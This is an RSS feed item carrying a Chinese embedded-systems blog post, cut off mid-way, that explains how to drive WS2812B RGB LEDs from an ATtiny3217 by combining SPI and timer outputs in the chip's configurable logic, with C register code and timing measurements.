<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>ATtiny3217 x WS2812B梦幻联动 - jerry_fuyi</title>
<link>http://www.cnblogs.com/jerry-fuyi/p/14320712.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jerry-fuyi/p/14320712.html</guid>
<description>&lt;p&gt;新款AVR单片机ATtiny3217，能用CCL实现SPI的MOSI、SCK和定时器输出的组合逻辑，直接点亮单线协议的RGB灯WS2812B——没有外部器件！&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;342.31001195182&quot;&gt;
&lt;p&gt;TinyAVR 1-series是Microchip于2018年推出的AVR单片机系列，定位是新一代的8位单片机，ATtiny3217是其中最高端的一款。相比于ATmega328P那个时代的AVR，ATtiny3217不仅增强了组件的功能，更是加入了EVSYS（Event System）和CCL（Configurable Custom Logic）这两大支撑CIP（Core Independent Peripherals）的组件，使得硬件中的消息传递十分灵活。对于我来说，有吸引力的是它带来的可玩性。&lt;/p&gt;
&lt;p&gt;可惜，ATtiny3217只提供VQFN-24封装，而且国内渠道不太好买到，另外还没有下载器。第三方开发板目前还没有，官方的则价格很贵，下不了手。&lt;/p&gt;
&lt;p&gt;WS2812B是Worldsemi（华彩威）的一款内置控制电路的LED，RGB三种颜色均有8位256级亮度。WS2812B的数据信号为单线归零码，带整形输出，（理论上）可以支持无限级联。单片机PWM控制RGB灯占用大量定时器资源，以旧AVR型号为例，RGB三个通道至少需要2个定时器，而定时器总共不过3个。在各种外置控制方案中，WS2812B整合了控制逻辑，更加小巧。&lt;/p&gt;
&lt;p&gt;WS2812B以5050、灯带和软屏等形式出售，很容易获得，自己用5050设计PCB也很方便。&lt;/p&gt;
&lt;p&gt;有一天我读到一篇&lt;a href=&quot;http://ww1.microchip.com/downloads/en/AppNotes/00002387B.pdf&quot; target=&quot;_blank&quot;&gt;application note&lt;/a&gt;，其中有用ATtiny1617（3217同系列）的CCL实现WS2812B的总线。我起初感到十分新奇，在看懂了实现原理之后，我直接拍手叫好——它利用SPI的&lt;code&gt;SCK&lt;/code&gt;和&lt;code&gt;MOSI&lt;/code&gt;信号和一个定时器的波形输出的逻辑运算获得了能驱动WS2812B的信号。这让我对ATtiny3217的执念更加深了。&lt;/p&gt;
&lt;p&gt;下面先来介绍一下今天的出场嘉宾。&lt;/p&gt;
&lt;h3 id=&quot;attiny3217-curiosity-nano&quot;&gt;&lt;a href=&quot;https://www.microchip.com/developmenttools/ProductDetails/EV50J96A&quot; target=&quot;_blank&quot;&gt;ATtiny3217 Curiosity Nano&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;半年前，趁着可以用公款的时机，我拔草了种草已久的开发板。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210124142632103-996100704.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在某宝买的，一块那么小的开发板竟然要105元。还有一款&lt;a href=&quot;https://www.microchip.com/DevelopmentTools/ProductDetails/PartNO/ATTINY3217-XPRO&quot; target=&quot;_blank&quot;&gt;ATtiny3217 Xplained Pro&lt;/a&gt;，要300+，还不包括扩展板，超出了预算限制。店家只有现货1块，队友买第2块的时候商家告知要去订货，于是就退款了。&lt;/p&gt;
&lt;p&gt;板上有两颗单片机：一个ATSAMD21E18，用作电源控制器、调试器、虚拟串口等；另一个当然是ATtiny3217啦。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210124144846189-1921877285.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;没错，调试器，这对于AVR是不多见的，因为调试器只有Microchip卖，它又卖得很贵——我们通常只用USBasp下载器。新的AVR系列都用UPDI（Unified Program and Debug Interface）来调试，包括烧写，USBasp是不支持的（但好像能支持xmega的PDI），而Curiosity Nano不仅能给板上的单片机调试，还可以通过官方推荐的硬改来调试外部单片机。&lt;/p&gt;
&lt;p&gt;开发板两边的排针孔之间有16 mil的错位，排针用力插进去就能连接牢固，无需焊接。&lt;/p&gt;
&lt;p&gt;ATtiny3217虽然从名字上看属于tiny系列，实际上比作为mega的ATmega328P和ATmega324PA等老产品强不少，至少跟xmega是一个级别的。在它之上有megaAVR 0-series（以ATmega4809为代表）系列和DA/DB系列，都是新产品。&lt;/p&gt;
&lt;p&gt;ATtiny3217拥有32 KB flash、256字节EEPROM和2 KB SRAM。新产品的EEPROM不是真正的EEPROM，而是在HEF（high-endurance flash）中模拟出来的，由NVMCTRL提供字节粒度的读写。（BTW：Microchip的PIC系列先开始这么做的；EEPROM成本较高，我在多款单片机中看到了用flash取代EEPROM的趋势。）&lt;/p&gt;
&lt;p&gt;CPU方面，0-/1-series都用AVRxt指令集（见&lt;a href=&quot;https://ww1.microchip.com/downloads/en/DeviceDoc/AVR-Instruction-Set-Manual-DS40002198A.pdf&quot; target=&quot;_blank&quot;&gt;AVR® Instruction Set Manual&lt;/a&gt;），相比328的AVRe+改进了指令周期数，主要是写RAM更快，使&lt;code&gt;CALL&lt;/code&gt;（子过程调用）、&lt;code&gt;ST&lt;/code&gt;（写RAM）、&lt;code&gt;PUSH&lt;/code&gt;（压栈）、&lt;code&gt;SBI&lt;/code&gt;和&lt;code&gt;CBI&lt;/code&gt;（I/O寄存器的位操作）各减少一个周期。其中&lt;code&gt;PUSH&lt;/code&gt;是最值得关注的，因为它大幅缩短了从事件触发到用户中断代码开始执行的间隔。（一个不太典型的中断disassembly见&lt;a href=&quot;https://www.cnblogs.com/jerry-fuyi/p/12207891.html&quot; target=&quot;_blank&quot;&gt;AVR单片机教程——定时器中断&lt;/a&gt;，它不典型在&lt;code&gt;push&lt;/code&gt;太少，一般至少十几个。）&lt;/p&gt;
&lt;p&gt;时钟终于不用通过熔丝位设置了，CLKCTRL可以运行时切换时钟源。中断也终于有两个优先级了，但有很多限制。&lt;/p&gt;
&lt;p&gt;外设方面，首先是从xmega开始，寄存器就以&lt;code&gt;struct&lt;/code&gt;来组织，比如以前设置&lt;code&gt;PB6&lt;/code&gt;为输出是&lt;code&gt;DDRB |= 1 &amp;lt;&amp;lt; 6&lt;/code&gt;，现在是&lt;code&gt;PORTB.DIR |= 1 &amp;lt;&amp;lt; 6&lt;/code&gt;或&lt;code&gt;PORTB.DIRSET = 1 &amp;lt;&amp;lt; 6&lt;/code&gt;。（xmega以前的AVR的寄存器定义是各单片机中做得最差的之一，就算我已经写过几十遍定时器1 ms中断，每次写之前还是得查datasheet才能知道WGM0[2:0]的哪个组合是CTC模式。但凡稍微正常一点的头文件都会给一个&lt;code&gt;TC0_WGM_CTC&lt;/code&gt;之类的宏吧。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jaycarlson.net/microcontrollers/#headers&quot; target=&quot;_blank&quot;&gt;The Amazing $1 Microcontroller&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote readability=&quot;14&quot;&gt;
&lt;p&gt;The worst header files were from the &lt;strong&gt;megaAVR&lt;/strong&gt;, the PSoC 4000S, the Kinetis KE04, the HT-66, the Sanyo LC-87. These header files have zero documentation, no predefined bit offsets, and no bit-addressable register definitions. Their header files are little more than register names attached to addresses.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实他们明明可以把这些宏定义补上去的。）&lt;/p&gt;
&lt;p&gt;每个外设都是新的，不仅是寄存器组织变了，功能也有很大改进：&lt;/p&gt;
&lt;ul readability=&quot;5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;GPIO：以&lt;code&gt;DIRSET&lt;/code&gt;等寄存器和虚拟端口两种方式支持位操作；一些组件的输入输出信号对应两组引脚，可以整体切换。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;定时器：16位TCA作PWM输出、2个16位TCB主要作输入、12位TCD生成两路同步PWM，还有一个16位RTC。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;总线：USART中的fractional baud rate generator可以处理主频和波特率非整数倍的情况；SPI有了缓冲区；I²C支持1 MHz的Fm+，主机和从机可以在两组引脚上单独工作。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;模拟：双10位ADC，其中一个会在需要时被电容触摸控制器占用，可通过随机延时消除任意频率的干扰；三个8位DAC，其中一个可以输出到外部；三个模拟比较器。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;CIP：CCL用组合与时序逻辑实现事件的组合，EVSYS控制组件之间的连接。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;针对CIP举个&lt;a href=&quot;http://ww1.microchip.com/downloads/en/AppNotes/DS00002451B.pdf&quot; target=&quot;_blank&quot;&gt;例子&lt;/a&gt;：按键按下时触发ADC转换，要求按键有消抖。常规的做法是每间隔一段时间读一次按键，用一定的算法消抖，判断按下时开始ADC转换；而借助CIP，这个功能可以这样实现：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210124220150669-2047944965.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按键的电平又GPIO读入，RTC产生一定频率的时钟，两者通过EVSYS接到CCL的LUT上（look-up table，可以实现任意3输入的组合逻辑，这里只用了按键一个输入），LUT输出接滤波器（filter，其输出在连续两次输入相同时才会更新），再通过EVSYS接到ADC触发转换。这些过程都是不需要CPU干预的，CPU此时应该处于一种睡眠状态，或在执行其他耗时的操作。ADC转换完成后产生中断，这才需要CPU执行相应代码。&lt;/p&gt;
&lt;h3 id=&quot;ws2812b&quot;&gt;WS2812B&lt;/h3&gt;
&lt;p&gt;WS2812B的信号是单线的，一方面这简化了灯带的设计，对级联也比较友好，但另一方面这种信号不是任何一种常见的总线，也不能由常见总线信号通过简单变换得到，这带来了一些困难。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125152844158-270352813.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;每一位都是先高电平后低电平，&lt;code&gt;0&lt;/code&gt;和&lt;code&gt;1&lt;/code&gt;的差别在于高低电平的时间不同，&lt;code&gt;0&lt;/code&gt;的高电平时间比较短。允许的时间范围都是比较宽的。通常每一位都是等长的，那么一位的时间范围为1.16 μs到1.38 μs。&lt;/p&gt;
&lt;p&gt;每个灯有4个引脚：&lt;code&gt;VCC&lt;/code&gt;、&lt;code&gt;GND&lt;/code&gt;、&lt;code&gt;DIN&lt;/code&gt;、&lt;code&gt;DO&lt;/code&gt;。&lt;code&gt;DO&lt;/code&gt;上的信号是&lt;code&gt;DIN&lt;/code&gt;信号除了前24个bit以外的部分，这24个bit以绿红蓝、MSB优先的顺序锁存进WS2812B。前一个灯的&lt;code&gt;DO&lt;/code&gt;接后一个的&lt;code&gt;DIN&lt;/code&gt;，如此级联。&lt;/p&gt;
&lt;p&gt;没有信号时数据线保持低电平，当低电平时间超过280 μs时就会RESET，锁存的数据更新到亮度上。所有级联的灯在几乎同一时刻更新。&lt;/p&gt;
&lt;p&gt;如果你以前接触过WS2812B，可能会觉得以上信息和你记忆中的有一些偏差。的确，上面这份&lt;a href=&quot;http://cn.world-semi.com/DownLoadFile/96&quot; target=&quot;_blank&quot;&gt;datasheet&lt;/a&gt;来自官网，而网上流传的是之前的版本，外网上比较通用的版本如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125154631127-807351899.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;有人对datasheet描述不明确感到不满，于是做了个&lt;a href=&quot;https://cpldcpu.wordpress.com/2014/01/14/light_ws2812-library-v2-0-part-i-understanding-the-ws2812/&quot; target=&quot;_blank&quot;&gt;实验&lt;/a&gt;测试高低电平时间的最低条件，并对WS2812B的内部原理作了猜测。实验结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125160754748-1257339704.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h3 id=&quot;方案&quot;&gt;方案&lt;/h3&gt;
&lt;p&gt;首先这不是我想出来的方案，链接在文首。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125130630363-678375256.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们让定时器产生两倍于&lt;code&gt;SCK&lt;/code&gt;频率的方波&lt;code&gt;WO2&lt;/code&gt;，上升沿对齐；&lt;code&gt;MOSI&lt;/code&gt;设置为上升沿更新，从&lt;code&gt;SCK&lt;/code&gt;上升沿到下一个上升沿为一个bit。在这一bit中，高电平占前1/4为WS2812B的&lt;code&gt;0&lt;/code&gt;，1/2为&lt;code&gt;1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;单片机时钟频率为10 MHz（内部20 MHz，分频系数2），&lt;code&gt;SCK&lt;/code&gt;频率为10 MHz / 16 = 625 kHz，&lt;code&gt;WO2&lt;/code&gt;频率为1.25 MHz。这样算下来t0H = 400 ns，t0L = 1200 ns，t1H = t1L = 800 ns。尽管不符合上述任何一个版本的时序，但是都差得不大，实测可以工作（我也不知道我买的WS2812B应该参考哪个时序）。&lt;/p&gt;
&lt;h4 id=&quot;时钟&quot;&gt;时钟&lt;/h4&gt;
&lt;p&gt;ATtiny3217的时钟可以用程序更改，但还是有一个参数需要用熔丝位设置——内部RC时钟是20 MHz还是16 MHz。出厂默认是20 MHz，所以就不用改了。如果要改的话，在Microchip Studio（原Atmel Studio）的菜单栏Tools/Device Programming里。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CLKCTRL&lt;/code&gt;寄存器组是被保护起来的，写入操作需要一个特殊的流程：先向&lt;code&gt;CCP&lt;/code&gt;（configuration change protection）寄存器里写IO寄存器对应的key，然后在4周期里写被保护的寄存器。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CCP = CCP_IOREG_gc;
CLKCTRL.MCLKCTRLB = CLKCTRL_PDIV_2X_gc | CLKCTRL_PEN_bm;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;赋值号左边是寄存器，大部分都是分组的；右边的&lt;code&gt;_gc&lt;/code&gt;表示group configuration，&lt;code&gt;_bm&lt;/code&gt;表示bit mask，还有&lt;code&gt;_bp&lt;/code&gt;表示bit position。&lt;/p&gt;
&lt;p&gt;下面是从&lt;code&gt;iotn3217.h&lt;/code&gt;（我们还是应该&lt;code&gt;#include &amp;lt;avr/io.h&amp;gt;&lt;/code&gt;）中截取的几段，展示了分组的寄存器定义以及相关的宏是如何用标准C语言实现的：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;typedef volatile uint8_t register8_t;

//--------------------------------------------------------------------------

/* Clock controller */
typedef struct CLKCTRL_struct
{
    register8_t MCLKCTRLA;  /* MCLK Control A */
    register8_t MCLKCTRLB;  /* MCLK Control B */
    register8_t MCLKLOCK;  /* MCLK Lock */
    register8_t MCLKSTATUS;  /* MCLK Status */
    register8_t reserved_1[12];
    register8_t OSC20MCTRLA;  /* OSC20M Control A */
    register8_t OSC20MCALIBA;  /* OSC20M Calibration A */
    register8_t OSC20MCALIBB;  /* OSC20M Calibration B */
    register8_t reserved_2[5];
    register8_t OSC32KCTRLA;  /* OSC32K Control A */
    register8_t reserved_3[3];
    register8_t XOSC32KCTRLA;  /* XOSC32K Control A */
    register8_t reserved_4[3];
} CLKCTRL_t;

/* CLKCTRL.MCLKCTRLB  bit masks and bit positions */
#define CLKCTRL_PEN_bm  0x01  /* Prescaler enable bit mask. */
#define CLKCTRL_PEN_bp  0  /* Prescaler enable bit position. */
#define CLKCTRL_PDIV_gm  0x1E  /* Prescaler division group mask. */
#define CLKCTRL_PDIV_gp  1  /* Prescaler division group position. */
#define CLKCTRL_PDIV0_bm  (1&amp;lt;&amp;lt;1)  /* Prescaler division bit 0 mask. */
#define CLKCTRL_PDIV0_bp  1  /* Prescaler division bit 0 position. */
#define CLKCTRL_PDIV1_bm  (1&amp;lt;&amp;lt;2)  /* Prescaler division bit 1 mask. */
#define CLKCTRL_PDIV1_bp  2  /* Prescaler division bit 1 position. */
#define CLKCTRL_PDIV2_bm  (1&amp;lt;&amp;lt;3)  /* Prescaler division bit 2 mask. */
#define CLKCTRL_PDIV2_bp  3  /* Prescaler division bit 2 position. */
#define CLKCTRL_PDIV3_bm  (1&amp;lt;&amp;lt;4)  /* Prescaler division bit 3 mask. */
#define CLKCTRL_PDIV3_bp  4  /* Prescaler division bit 3 position. */

/* Prescaler division select */
typedef enum CLKCTRL_PDIV_enum
{
    CLKCTRL_PDIV_2X_gc = (0x00&amp;lt;&amp;lt;1),  /* 2X */
    CLKCTRL_PDIV_4X_gc = (0x01&amp;lt;&amp;lt;1),  /* 4X */
    CLKCTRL_PDIV_8X_gc = (0x02&amp;lt;&amp;lt;1),  /* 8X */
    CLKCTRL_PDIV_16X_gc = (0x03&amp;lt;&amp;lt;1),  /* 16X */
    CLKCTRL_PDIV_32X_gc = (0x04&amp;lt;&amp;lt;1),  /* 32X */
    CLKCTRL_PDIV_64X_gc = (0x05&amp;lt;&amp;lt;1),  /* 64X */
    CLKCTRL_PDIV_6X_gc = (0x08&amp;lt;&amp;lt;1),  /* 6X */
    CLKCTRL_PDIV_10X_gc = (0x09&amp;lt;&amp;lt;1),  /* 10X */
    CLKCTRL_PDIV_12X_gc = (0x0A&amp;lt;&amp;lt;1),  /* 12X */
    CLKCTRL_PDIV_24X_gc = (0x0B&amp;lt;&amp;lt;1),  /* 24X */
    CLKCTRL_PDIV_48X_gc = (0x0C&amp;lt;&amp;lt;1),  /* 48X */
} CLKCTRL_PDIV_t;

//--------------------------------------------------------------------------

#define CLKCTRL           (*(CLKCTRL_t *) 0x0060) /* Clock controller */
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;spi&quot;&gt;SPI&lt;/h4&gt;
&lt;p&gt;上升沿串出，下降沿采样，这是SPI mode 1。&lt;code&gt;SCK&lt;/code&gt;频率为主频除以16。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SPI0.CTRLA = SPI_MASTER_bm | SPI_PRESC_DIV16_gc | SPI_ENABLE_bm;
SPI0.CTRLB = SPI_SSD_bm | SPI_MODE_1_gc;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SPI发送一字节：向寄存器写入来发送，轮询寄存器等待发送完成。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SPI0.DATA = byte;
while (!(SPI0.INTFLAGS &amp;amp; SPI_IF_bm))
        ;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;tca&quot;&gt;TCA&lt;/h4&gt;
&lt;p&gt;产生方波通常用CTC（现FRQ）模式，但是极性不好控制（其实现在有&lt;code&gt;CMPnOV&lt;/code&gt;位了），改用PWM。设置&lt;code&gt;PER&lt;/code&gt;为&lt;code&gt;7&lt;/code&gt;，PWM周期为8个CPU周期；&lt;code&gt;CMP2&lt;/code&gt;为4，占空比为4 / 8 = 50%。&lt;/p&gt;
&lt;p&gt;没有硬件设施可以实现定时器和SPI的同步，所以在初始化中先不开启定时器输出。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc;
TCA0.SINGLE.CTRLB = TCA_SINGLE_CMP2EN_bm | TCA_SINGLE_WGMODE_SINGLESLOPE_gc;
TCA0.SINGLE.PER = 7;
TCA0.SINGLE.CMP2 = 4;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（TCA有两种模式：一个16位（single）和两个8位（split）。你觉得&lt;code&gt;TCA0.SINGLE&lt;/code&gt;和&lt;code&gt;TCA0.SPLIT&lt;/code&gt;是什么关系呢？）&lt;/p&gt;
&lt;p&gt;在SPI发送时要求&lt;code&gt;WO2&lt;/code&gt;和&lt;code&gt;SCK&lt;/code&gt;同步，但此时并不知道计数器&lt;code&gt;CNT&lt;/code&gt;的值，所以把它清零，然后开启输出。SPI发送完后再关闭输出。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;void ws2812b_write(uint8_t byte)
{
    TCA0.SINGLE.CNT = 0;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc | TCA_SINGLE_ENABLE_bm;
    SPI0.DATA = byte;
    while (!(SPI0.INTFLAGS &amp;amp; SPI_IF_bm))
        ;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc;
    TCA0.SINGLE.CTRLC = 0;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;ccl&quot;&gt;CCL&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125193443542-743926437.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LUT&lt;/code&gt;寄存器的8位分别存放&lt;code&gt;IN[2:0]&lt;/code&gt;的8种状态对应的输出。根据前面的时序图，在&lt;code&gt;011&lt;/code&gt;、&lt;code&gt;101&lt;/code&gt;和&lt;code&gt;111&lt;/code&gt;三种情况下输出为&lt;code&gt;1&lt;/code&gt;，&lt;code&gt;LUT&lt;/code&gt;值为&lt;code&gt;0xA8&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CCL.LUT1CTRLB = CCL_INSEL1_SPI0_gc | CCL_INSEL0_SPI0_gc;
CCL.LUT1CTRLC = CCL_INSEL2_TCA0_gc;
CCL.TRUTH1 = 0xA8;
CCL.LUT1CTRLA = CCL_OUTEN_bm | CCL_ENABLE_bm;
CCL.CTRLA = CCL_RUNSTDBY_bm | CCL_ENABLE_bm;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;CCL的寄存器是被&lt;code&gt;ENABLE&lt;/code&gt;保护的，在&lt;code&gt;ENABLE&lt;/code&gt;为&lt;code&gt;1&lt;/code&gt;时不能更改，因此要先配置其他寄存器，再enable LUT，最后enable CCL。&lt;/p&gt;
&lt;p&gt;并非每个信号都能作为LUT的任意输入，如&lt;code&gt;SCK&lt;/code&gt;只能接&lt;code&gt;IN0&lt;/code&gt;、&lt;code&gt;MOSI&lt;/code&gt;只能接&lt;code&gt;IN1&lt;/code&gt;，而普通的GPIO则不能直接接进LUT。如果需要的话，可以把GPIO接到event channel上，设置其用户为LUT，再在LUT中选择对应的EVOUT。如果&lt;code&gt;SCK&lt;/code&gt;要接&lt;code&gt;IN1&lt;/code&gt;而&lt;code&gt;MOSI&lt;/code&gt;接&lt;code&gt;IN0&lt;/code&gt;，只能用EVSYS这种方法，但这没有任何意义——总是可以通过修改&lt;code&gt;LUT&lt;/code&gt;达到相同的功能。&lt;/p&gt;
&lt;h4 id=&quot;gpio&quot;&gt;GPIO&lt;/h4&gt;
&lt;p&gt;（Datasheet中的一些“GPIO”指的是GPIOR（general-purpose I/O registers），我们讲的GPIO叫“PORT”，有些章节里也叫“GPIO”。）&lt;/p&gt;
&lt;p&gt;为了和application note中一致，SPI0和LUT1的输出都移到非默认的引脚上，在那里默认引脚和其他功能冲突了。Alternative pins通过&lt;code&gt;PORTMUX&lt;/code&gt;配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PORTMUX.CTRLA = PORTMUX_LUT1_ALTERNATE_gc;
PORTMUX.CTRLB = PORTMUX_SPI0_ALTERNATE_gc;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;按键在&lt;code&gt;PB7&lt;/code&gt;上，没有外部上拉电阻，启用内部上拉电阻（在）；LED在&lt;code&gt;PA3&lt;/code&gt;上，&lt;code&gt;LUT1-OUT&lt;/code&gt;即WS2812B的信号在&lt;code&gt;PC1&lt;/code&gt;上，输出；&lt;code&gt;SCK&lt;/code&gt;、&lt;code&gt;MOSI&lt;/code&gt;、&lt;code&gt;WO2&lt;/code&gt;分别在&lt;code&gt;PC0&lt;/code&gt;、&lt;code&gt;PC2&lt;/code&gt;、&lt;code&gt;PB2&lt;/code&gt;上，为了用逻辑分析仪观察波形，也配置为输出。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;PORTA.DIRSET = PIN3_bm;
PORTB.DIRSET = PIN2_bm;
PORTB.PIN7CTRL = PORT_PULLUPEN_bm;
PORTC.DIRSET = PIN2_bm | PIN1_bm | PIN0_bm;
&lt;/code&gt;
&lt;/pre&gt;
&lt;details readability=&quot;5&quot;&gt;为了便于测试，写个在按键按下时翻转LED并写8个WS2812B的逻辑（点击展开）：
&lt;pre&gt;
&lt;code&gt;#include &amp;lt;stdbool.h&amp;gt;
#include &amp;lt;avr/io.h&amp;gt;
#define F_CPU 10000000
#include &amp;lt;util/delay.h&amp;gt;

void ws2812b_write(uint8_t byte)
{
    TCA0.SINGLE.CNT = 0;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc | TCA_SINGLE_ENABLE_bm;
    SPI0.DATA = byte;
    while (!(SPI0.INTFLAGS &amp;amp; SPI_IF_bm))
        ;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc;
    TCA0.SINGLE.CTRLC = 0;
}

int main()
{
    CCP = CCP_IOREG_gc;
    CLKCTRL.MCLKCTRLB = CLKCTRL_PDIV_2X_gc | CLKCTRL_PEN_bm;
    SPI0.CTRLA = SPI_MASTER_bm | SPI_PRESC_DIV16_gc | SPI_ENABLE_bm;
    SPI0.CTRLB = SPI_SSD_bm | SPI_MODE_1_gc;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc;
    TCA0.SINGLE.CTRLB = TCA_SINGLE_CMP2EN_bm | TCA_SINGLE_WGMODE_SINGLESLOPE_gc;
    TCA0.SINGLE.PER = 7;
    TCA0.SINGLE.CMP2 = 4;
    CCL.LUT1CTRLB = CCL_INSEL1_SPI0_gc | CCL_INSEL0_SPI0_gc;
    CCL.LUT1CTRLC = CCL_INSEL2_TCA0_gc;
    CCL.TRUTH1 = 0xA8;
    CCL.LUT1CTRLA = CCL_OUTEN_bm | CCL_ENABLE_bm;
    CCL.CTRLA = CCL_RUNSTDBY_bm | CCL_ENABLE_bm;
    PORTMUX.CTRLA = PORTMUX_LUT1_ALTERNATE_gc;
    PORTMUX.CTRLB = PORTMUX_SPI0_ALTERNATE_gc;
    PORTA.DIRSET = PIN3_bm;
    PORTB.DIRSET = PIN2_bm;
    PORTB.PIN7CTRL = PORT_PULLUPEN_bm;
    PORTC.DIRSET = PIN2_bm | PIN1_bm | PIN0_bm;
    bool prev = 0;
    while (1)
    {
        bool curr = PORTB.IN &amp;amp; PIN7_bm;
        if (prev &amp;amp;&amp;amp; !curr)
        {
            for (uint8_t i = 0; i != 24; ++i)
                ws2812b_write(0x0A);
            PORTA.OUTTGL = PIN3_bm;
        }
        prev = curr;
        _delay_ms(1);
    }
}
&lt;/code&gt;
&lt;/pre&gt;&lt;/details&gt;&lt;h3 id=&quot;测试结果&quot;&gt;测试结果&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125204459209-1106329244.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;It works!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125204802814-593855000.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这是一个字节的波形。&lt;code&gt;WO2&lt;/code&gt;在左右各有一个额外的周期，但这并不影响&lt;code&gt;LUT1-OUT&lt;/code&gt;在闲时为低电平（idle state = low）。&lt;/p&gt;

&lt;h3 id=&quot;改进&quot;&gt;改进&lt;/h3&gt;
&lt;p&gt;先别高兴得太早，看看这里最后两个字节：&lt;/p&gt;
